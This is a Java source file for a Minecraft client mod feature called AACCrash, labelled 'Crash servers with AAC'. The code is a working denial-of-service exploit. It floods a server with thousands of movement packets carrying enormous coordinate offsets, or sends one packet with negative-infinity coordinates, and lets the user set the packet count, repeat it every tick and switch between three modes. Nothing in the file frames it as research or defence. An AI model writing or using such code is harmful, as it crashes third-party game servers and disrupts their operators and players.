package me.dustin.crash.feature;

import me.dustin.crash.CrashPlugin;
import me.dustin.events.core.EventListener;
import me.dustin.events.core.annotate.EventPointer;
import me.dustin.jex.event.filters.PlayerPacketsFilter;
import me.dustin.jex.event.filters.TickFilter;
import me.dustin.jex.event.misc.EventTick;
import me.dustin.jex.event.player.EventPlayerPackets;
import me.dustin.jex.feature.mod.core.Feature;
import me.dustin.jex.feature.property.Property;
import me.dustin.jex.helper.misc.Wrapper;
import me.dustin.jex.helper.network.NetworkHelper;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;

public class AACCrash extends Feature {

    public final Property<AACMode> modeProperty = new Property.PropertyBuilder<AACMode>(this.getClass())
            .name("Mode")
            .value(AACMode.NEW)
            .build();
    public final Property<Integer> packetCountProperty = new Property.PropertyBuilder<Integer>(this.getClass())
            .name("Packet Count")
            .value(5000)
            .min(1)
            .max(100000)
            .inc(100)
            .build();
    public final Property<Boolean> everyTickProperty = new Property.PropertyBuilder<Boolean>(this.getClass())
            .name("Every Tick")
            .value(false)
            .build();
    public final Property<Boolean> autoDisableProperty = new Property.PropertyBuilder<Boolean>(this.getClass())
            .name("Auto Disable")
            .value(false)
            .build();

    public AACCrash() {
        super(CrashPlugin.CRASH, "Crash servers with AAC");
    }

    @Override
    public void onEnable() {
        if (Wrapper.INSTANCE.getWorld() != null && Wrapper.INSTANCE.getLocalPlayer() != null && !everyTickProperty.value()) {
            sendPackets();
        }
        setState(false);
    }

    @EventPointer
    private final EventListener<EventPlayerPackets> eventPlayerPacketsEventListener = new EventListener<>(eventPlayerPackets -> {
        if (everyTickProperty.value())
            sendPackets();
    }, new PlayerPacketsFilter(EventPlayerPackets.Mode.PRE));

    @EventPointer
    private final EventListener<EventTick> eventTickEventListener = new EventListener<>(eventTick -> {
        if (Wrapper.INSTANCE.getWorld() == null || Wrapper.INSTANCE.getLocalPlayer() == null && autoDisableProperty.value())
            setState(false);
    }, new TickFilter(EventTick.Mode.PRE));

    private void sendPackets() {
        switch (modeProperty.value()) {
            case NEW -> {
                for (int i = 0; i < packetCountProperty.value(); i++) {
                    NetworkHelper.INSTANCE.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(Wrapper.INSTANCE.getLocalPlayer().getX() + (9412 * i), Wrapper.INSTANCE.getLocalPlayer().getY() + (9412 * i), Wrapper.INSTANCE.getLocalPlayer().getZ() + (9412 * i), true));
                }
            }
            case OTHER -> {
                for (int i = 0; i < packetCountProperty.value(); i++) {
                    NetworkHelper.INSTANCE.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(Wrapper.INSTANCE.getLocalPlayer().getX() + (500000 * i), Wrapper.INSTANCE.getLocalPlayer().getY() + (500000 * i), Wrapper.INSTANCE.getLocalPlayer().getZ() + (500000 * i), true));
                }
            }
            case OLD -> {
                NetworkHelper.INSTANCE.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, true));
            }
        }
    }

    public enum AACMode {
        NEW, OTHER, OLD
    }
}
